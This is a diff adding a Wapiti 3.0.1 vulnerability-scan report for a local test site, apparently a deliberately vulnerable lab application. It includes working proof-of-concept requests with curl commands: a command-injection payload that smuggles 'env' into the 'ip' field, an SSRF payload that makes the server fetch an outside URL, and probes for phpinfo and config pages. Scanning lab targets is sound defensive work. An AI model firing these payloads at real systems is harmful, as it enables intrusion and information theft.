@@ -1,0 +1,106 @@
+********************************************************************************
+                     Wapiti 3.0.1 - wapiti.sourceforge.net
+                       Report for http://localhost:8000/
+              Date of the scan : Sun, 28 Jul 2019 13:45:01 +0000
+                          Scope of the scan : folder
+********************************************************************************
+
+Summary of vulnerabilities :
+----------------------------
+                                                            SQL Injection :   0
+                                                      Blind SQL Injection :   0
+                                                            File Handling :   0
+                                                     Cross Site Scripting :   0
+                                                           CRLF Injection :   0
+                                                       Commands execution :   1
+                                                          Htaccess Bypass :   0
+                                                              Backup file :   0
+                                               Potentially dangerous file :   5
+                                              Server Side Request Forgery :   1
+********************************************************************************
+
+Commands execution
+------------------
+Command execution via injection in the parameter ip
+Evil request:
+    POST /vulnerabilities/exec/ HTTP/1.1
+    Host: localhost:8000
+    Referer: http://localhost:8000/vulnerabilities/exec/
+    Content-Type: application/x-www-form-urlencoded
+
+    ip=default%0Aenv&Submit=Submit
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/exec/" -e "http://localhost:8000/vulnerabilities/exec/" -d "ip=default%0Aenv&Submit=Submit""
+
+                                  *   *   *
+
+********************************************************************************
+
+Potentially dangerous file
+--------------------------
+Configuration information may be available remotely.
+Evil request:
+    GET /config/ HTTP/1.1
+    Host: localhost:8000
+cURL command PoC : "curl "http://localhost:8000/config/""
+
+                                  *   *   *
+
+Contains PHP configuration information
+References:
+http://osvdb.org/show/osvdb/3233
+Evil request:
+    GET /phpinfo.php HTTP/1.1
+    Host: localhost:8000
+cURL command PoC : "curl "http://localhost:8000/phpinfo.php""
+
+                                  *   *   *
+
+PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+References:
+http://osvdb.org/show/osvdb/12184
+Evil request:
+    GET /index.php?%3DPHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.1
+    Host: localhost:8000
+cURL command PoC : "curl "http://localhost:8000/index.php?%3DPHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000""
+
+                                  *   *   *
+
+Apache default file found.
+References:
+http://osvdb.org/show/osvdb/3233
+Evil request:
+    GET /icons/README HTTP/1.1
+    Host: localhost:8000
+cURL command PoC : "curl "http://localhost:8000/icons/README""
+
+                                  *   *   *
+
+Admin login page/section found.
+Evil request:
+    GET /login.php HTTP/1.1
+    Host: localhost:8000
+cURL command PoC : "curl "http://localhost:8000/login.php""
+
+                                  *   *   *
+
+********************************************************************************
+
+Server Side Request Forgery
+---------------------------
+SSRF vulnerability via injection in the parameter page.
+The target performed an outgoing HTTP GET request at 2019-07-28T15:50:58+02:00 with IP 195.206.183.149.
+Full request can be seen at https://wapiti3.ovh/ssrf_data/ni0mhy/36/70616765/1564321858-195.206.183.149.txt
+Evil request:
+    GET /vulnerabilities/fi/?page=http%3A%2F%2Fexternal.url%2Fpage HTTP/1.1
+    Host: localhost:8000
+cURL command PoC : "curl "http://localhost:8000/vulnerabilities/fi/?page=http%3A%2F%2Fexternal.url%2Fpage""
+
+                                  *   *   *
+
+********************************************************************************
+
+Summary of anomalies :
+----------------------
+                                                    Internal Server Error :   0
+                                                     Resource consumption :   0
+********************************************************************************
